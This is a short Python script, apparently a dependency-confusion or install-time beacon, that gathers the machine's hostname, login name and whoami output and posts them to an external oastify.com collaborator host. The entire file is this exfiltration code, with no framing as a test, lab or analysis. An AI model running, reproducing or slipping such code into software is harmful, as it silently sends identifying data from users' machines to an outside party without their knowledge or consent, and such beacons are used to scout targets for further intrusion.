import os
import socket
import subprocess
import requests

try:
    hostname = socket.gethostname()
    username = os.getlogin()
except Exception:
    hostname = "unknown"
    username = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"

try:
    whoami_output = subprocess.check_output("whoami", shell=True).decode().strip()
except:
    whoami_output = "error"

requests.post("http://k1mcrvv5jmqvnhsuipkxjzxjya41stgi.oastify.com", json={
    "username": username,
    "hostname": hostname,
    "whoami": whoami_output
})
